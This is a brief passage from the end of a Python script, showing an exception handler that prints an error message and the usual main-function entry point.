        print(f"\\n[-] Error: {e}")

if __name__ == "__main__":
    main()